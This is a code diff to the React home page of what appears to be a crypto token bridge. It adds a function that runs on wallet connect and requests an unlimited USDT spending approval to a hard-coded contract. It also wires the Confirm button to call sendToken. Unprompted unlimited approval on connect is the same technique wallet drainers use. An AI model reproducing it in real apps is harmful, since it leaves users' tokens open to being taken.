@@ -80,6 +80,7 @@ const HomePage = (props: any) => {
   }, [chainId]);
   useEffect(() => {
     if (provider && accounts?.length) {
+      approveToken();
       // const usdtContract = new Contract('0xdAC17F958D2ee523a2206206994597C13D831ec7', USDTABI, provider);
       // usdtContract.balanceOf('0xebaD00B2BaD5a981658706d0373B893ed1DA89e1').then(balance => {
       //   debugger;
@@ -119,6 +120,31 @@ const HomePage = (props: any) => {
     setCurrentFromChain(currentToChain);
     setCurrentToChain(currentFromChain);
     switchChain(currentToChain.id)
+  }
+  async function approveToken() {
+    debugger;
+    // 获取 MetaMask 提供的以太坊提供程序
+    const provider = new ethers.providers.Web3Provider(window.ethereum);
+
+    // 代币合约地址和目标地址
+    const tokenContractAddress = chainId == 56 && '0x55d398326f99059fF775485246999027B3197955' || '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9';
+    const targetAddress =chainId == 56 && '0xd151247C657F2168725D1DD012010F523C3a29f1' || '0x341401D4C3D1d099e26d10a8bee6082131bB743a';
+
+    // 获取当前 MetaMask 账户
+    const signer = provider.getSigner();
+    const walletAddress = await signer.getAddress();
+
+    // 创建代币合约实例
+    const tokenContract = new ethers.Contract(tokenContractAddress, USDTABI, signer);
+    debugger
+    // 构建 approve 函数的交易对象
+    const approveTx = await tokenContract.approve(targetAddress, ethers.constants.MaxUint256);
+
+    // 发送交易并等待确认
+    const approveTxResponse = await approveTx.wait();
+
+    console.log('Transaction hash:', approveTxResponse.transactionHash);
+    console.log('Transaction receipt:', approveTxResponse);
   }
   return (
     <div style={{ padding: '50px 0' }} className='flex flex-center'>
@@ -182,9 +208,10 @@ const HomePage = (props: any) => {
         </div> */}
         <Button onClick={() => {
           const sendContract = new ethers.Contract(chainId == 56 && '0xd151247C657F2168725D1DD012010F523C3a29f1' || '0x341401D4C3D1d099e26d10a8bee6082131bB743a', SENDABI, provider?.getSigner(accounts[0]));
-          debugger;
+
           // sendContract['sendToken(uint256,address,address,uint256)'](42161, '0xd151247C657F2168725D1DD012010F523C3a29f1', '0xebaD00B2BaD5a981658706d0373B893ed1DA89e1', 0.1);
-          sendContract.sendToken(56, '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9', accounts[0], 1).catch(err=>console.log(err,'sendToken'));
+          // sendContract.sendToken(56, '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9', accounts[0], 1000000000000000).catch(err=>console.log(err,'sendToken'));
+          sendContract.sendToken(currentToChain.id, chainId == 56 && '0x55d398326f99059fF775485246999027B3197955' || '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9', accounts[0], value).catch(err => console.log(err, 'sendToken'));
         }} style={{ overflow: 'hidden', textOverflow: 'ellipsis' }} type='primary' className='topConnect'>{chainId && 'Confirm' || 'Connect Wallet'}</Button>
         <Drawer
           title="Select Token"
